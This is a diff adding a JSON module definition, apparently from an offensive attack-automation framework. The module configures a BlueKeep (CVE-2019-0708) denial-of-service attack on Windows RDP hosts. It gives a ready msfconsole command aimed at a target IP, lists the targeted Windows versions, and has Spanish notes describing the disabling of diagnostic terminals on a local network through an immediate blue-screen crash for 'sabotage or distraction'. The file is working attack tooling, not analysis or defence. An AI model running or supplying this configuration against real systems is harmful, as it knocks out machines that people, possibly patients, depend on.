@@ -1,0 +1,22 @@
+{
+  "module_id": "CVE_2019_0708",
+  "name": "BlueKeep RDP Denial of Service",
+  "tactic": "TA0040_Impact",
+  "technique": "T1499.002",
+  "priority": "MEDIUM",
+  "dependencies": ["metasploit-framework", "rdp_protocol_lib"],
+  "targeting_intel": {
+    "os_family": "Windows",
+    "supported_versions": ["XP (32-bit)", "7 (64-bit)", "Server 2008 R2"],
+    "vulnerability": "CVE-2019-0708",
+    "hcg_scenario": "Inutilización de terminales de diagnóstico que dependen de servicios RDP expuestos en la red local."
+  },
+  "execution_config": {
+    "command": "msfconsole -x 'use auxiliary/dos/windows/rdp/cve_2019_0708_bluekeep; set RHOSTS <TARGET_IP>; run'",
+    "options": {
+      "RDP_CLIENT_NAME": "rdesktop",
+      "RPORT": 3389
+    }
+  },
+  "stability_notes": "Provoca CRASH_OS_DOWN (BSOD) inmediato. No es un vector de persistencia, sino de sabotaje o distracción."
+}
